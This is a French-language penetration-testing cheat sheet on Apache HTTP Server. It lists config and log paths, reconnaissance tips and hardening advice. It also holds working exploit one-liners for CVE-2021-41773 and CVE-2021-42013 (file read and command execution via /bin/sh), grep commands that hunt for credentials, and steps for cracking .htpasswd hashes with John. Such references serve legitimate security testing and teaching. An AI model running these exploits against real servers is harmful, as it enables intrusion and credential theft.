# Apache HTTP Server

!!! info "Informations"
    **Catégorie:** Web Server  
    **Tags:** 'web' 'http' 'server' 'apache'  
    **Criticité:** 🔴 Haute

## Description

Apache HTTP Server est le serveur web open source le plus populaire au monde. Il est utilisé pour héberger des sites web et applications sur Internet depuis 1995. Apache est connu pour sa flexibilité, sa robustesse et son architecture modulaire.

---

## Fichiers de Configuration

=== "Linux (Debian/Ubuntu)"
    ```bash
    # Configuration principale
    /etc/apache2/apache2.conf
    /etc/apache2/envvars
    
    # Sites disponibles et activés
    /etc/apache2/sites-available/
    /etc/apache2/sites-enabled/
    
    # Modules
    /etc/apache2/mods-available/
    /etc/apache2/mods-enabled/
    
    # Configuration supplémentaire
    /etc/apache2/conf-available/
    /etc/apache2/conf-enabled/
    
    # Ports
    /etc/apache2/ports.conf
    ```

=== "Linux (RedHat/CentOS)"
    ```bash
    # Configuration principale
    /etc/httpd/conf/httpd.conf
    
    # Configuration additionnelle
    /etc/httpd/conf.d/
    /etc/httpd/conf.modules.d/
    
    # Virtual hosts
    /etc/httpd/conf.d/vhost.conf
    ```

=== "Windows"
    ```powershell
    # Installation standard
    C:\Apache24\conf\httpd.conf
    C:\Apache24\conf\extra\
    
    # XAMPP
    C:\xampp\apache\conf\httpd.conf
    C:\xampp\apache\conf\extra\httpd-vhosts.conf
    
    # WAMP
    C:\wamp64\bin\apache\apache2.x.x\conf\httpd.conf
    ```

=== "macOS"
    ```bash
    # Installation système
    /etc/apache2/httpd.conf
    /etc/apache2/extra/
    
    # Homebrew
    /usr/local/etc/httpd/httpd.conf
    /opt/homebrew/etc/httpd/httpd.conf
    ```

---

## Fichiers de Logs

```bash
# Debian/Ubuntu
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/apache2/other_vhosts_access.log

# RedHat/CentOS
/var/log/httpd/access_log
/var/log/httpd/error_log

# Windows (XAMPP)
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
```

---

## Fichiers Sensibles

!!! danger "Credentials et données sensibles"
    Les fichiers suivants peuvent contenir des informations critiques :
    
    - `.htpasswd` - Fichiers de mots de passe (Basic Auth)
    - `.htaccess` - Règles de configuration et redirections
    - `ssl/private/*.key` - Clés privées SSL/TLS
    - `conf.d/*-secrets.conf` - Configurations avec secrets
    - `/etc/apache2/envvars` - Variables d'environnement

!!! warning "Fichiers de sauvegarde"
    N'oubliez pas de vérifier les backups :
    
    - `*.conf~`
    - `*.conf.bak`
    - `*.conf.old`
    - `*.conf.backup`
    - `*.conf.save`

---

## Répertoires Web

```bash
# Debian/Ubuntu
/var/www/html/
/var/www/

# RedHat/CentOS
/var/www/html/
/usr/share/httpd/

# Windows (XAMPP)
C:\xampp\htdocs\

# macOS
/Library/WebServer/Documents/
```

---

## Tips Pentest

!!! tip "Reconnaissance"
    - Identifier la version via les headers HTTP : `Server: Apache/2.4.41`
    - Vérifier les modules chargés : `apache2 -M` ou `httpd -M`
    - Scanner les ports : 80 (HTTP), 443 (HTTPS), 8080, 8443

!!! tip "Énumération"
    - Chercher les répertoires exposés : `.git/`, `.svn/`, `backup/`
    - Tester les fichiers sensibles : `.htaccess`, `.htpasswd`, `phpinfo.php`
    - Identifier les VirtualHosts via SNI ou Host header manipulation
    - Lister les fichiers dans `/icons/`, `/manual/` si activés

!!! tip "Exploitation"
    - **Path Traversal** : Tester `../../../etc/passwd` si mal configuré
    - **Server-Side Includes (SSI)** : Chercher `.shtml` files
    - **CGI Scripts** : Vérifier `/cgi-bin/` pour shellshock ou autres vulns
    - **Mod_rewrite** : Analyser les règles pour bypass d'authentification

!!! tip "Post-Exploitation"
    - Extraire les credentials de `.htpasswd` (hash MD5)
    - Analyser les logs pour trouver d'autres cibles
    - Chercher les tokens/API keys dans les fichiers de config
    - Identifier les applications hébergées via les VirtualHosts

---

## Commandes Utiles

```bash
# Vérifier si Apache est actif
systemctl status apache2  # Debian/Ubuntu
systemctl status httpd    # RedHat/CentOS
ps aux | grep apache

# Tester la configuration
apache2ctl configtest     # Debian/Ubuntu
httpd -t                  # RedHat/CentOS

# Lister les modules chargés
apache2ctl -M             # Debian/Ubuntu
httpd -M                  # RedHat/CentOS

# Localiser les fichiers de configuration
find / -name "apache*.conf" 2>/dev/null
find / -name "httpd.conf" 2>/dev/null
locate apache2.conf

# Rechercher des credentials
grep -r "password" /etc/apache2/ 2>/dev/null
grep -r "Auth" /etc/apache2/ 2>/dev/null

# Lire les logs en temps réel
tail -f /var/log/apache2/access.log
tail -f /var/log/apache2/error.log
```

---

## Vulnérabilités Connues

??? danger "CVE-2021-41773 - Path Traversal"
    Vulnérabilité critique permettant la lecture de fichiers arbitraires.
    
    **Versions affectées :** Apache 2.4.49  
    **Exploit :**
    ```bash
    curl http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
    ```

??? danger "CVE-2021-42013 - RCE via Path Traversal"
    Contournement du patch CVE-2021-41773 permettant l'exécution de code.
    
    **Versions affectées :** Apache 2.4.49, 2.4.50  
    **Exploit :**
    ```bash
    curl 'http://target/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' -d 'echo Content-Type: text/plain; echo; id'
    ```

---

## Sécurisation

!!! success "Bonnes pratiques"
    - Désactiver la signature du serveur : `ServerTokens Prod` et `ServerSignature Off`
    - Restreindre l'accès aux répertoires sensibles via `.htaccess`
    - Utiliser HTTPS avec des certificats valides (Let's Encrypt)
    - Désactiver les modules non utilisés : `a2dismod [module]`
    - Limiter la taille des requêtes : `LimitRequestBody`
    - Activer ModSecurity (WAF)
    - Maintenir Apache à jour régulièrement

---

## Références

- [Apache HTTP Server Documentation](https://httpd.apache.org/docs/)
- [OWASP Web Server Configuration](https://cheatsheetseries.owasp.org/cheatsheets/Apache_Configuration_Cheat_Sheet.html)
- [Apache CVE List](https://httpd.apache.org/security/vulnerabilities_24.html)
- [HackerOne Apache Reports](https://hackerone.com/apache)

---

## Exemples d'Exploitation

??? example "Lecture de .htpasswd"
    ```bash
    # Si le répertoire est mal configuré
    curl http://target/.htpasswd
    
    # Hash trouvé
    admin:$apr1$ABC123$xyz...
    
    # Cracker avec John
    john --wordlist=/usr/share/wordlists/rockyou.txt htpasswd.txt
    ```

??? example "Énumération VirtualHosts"
    ```bash
    # Via Host header
    for vhost in www admin api dev staging; do
        curl -H "Host: $vhost.target.com" http://target-ip/
    done
    
    # Via gobuster
    gobuster vhost -u http://target.com -w vhosts.txt
    ```

---

## Métadonnées

- **Version du template:** 1.0
- **Dernière mise à jour:** Novembre 2024
- **Contributeur:** EpiHack Bénin
- **Sources vérifiées:** Oui